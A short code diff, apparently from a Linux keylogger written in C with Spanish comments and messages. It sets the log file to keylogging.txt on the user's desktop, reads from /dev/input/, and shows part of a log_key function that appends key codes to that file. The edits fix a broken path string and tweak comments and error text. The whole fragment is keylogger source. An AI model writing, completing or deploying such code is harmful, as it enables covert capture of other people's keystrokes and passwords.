@@ -7,9 +7,9 @@
 #include <dirent.h>
 
 #define HOME_DIR getenv("HOME")
-#define LOG_FILE /Escritorio/keylogging.txt"
+#define LOG_FILE "/Desktop/keylogging.txt"
 #define INPUT_DIR "/dev/input/"
-#define DEVICE_PATH_SIZE 512  
+#define DEVICE_PATH_SIZE 512  // Aumentar el tamaño del búfer
 
 void log_key(int code) {
     char log_path[256];
@@ -17,7 +17,7 @@ void log_key(int code) {
 
     FILE *file = fopen(log_path, "a");
     if (file == NULL) {
-        perror("No se pudo abrir o crear el archivo de registro");
+        perror("No se pudo abrir el archivo de registro");
         exit(EXIT_FAILURE);
     }
 
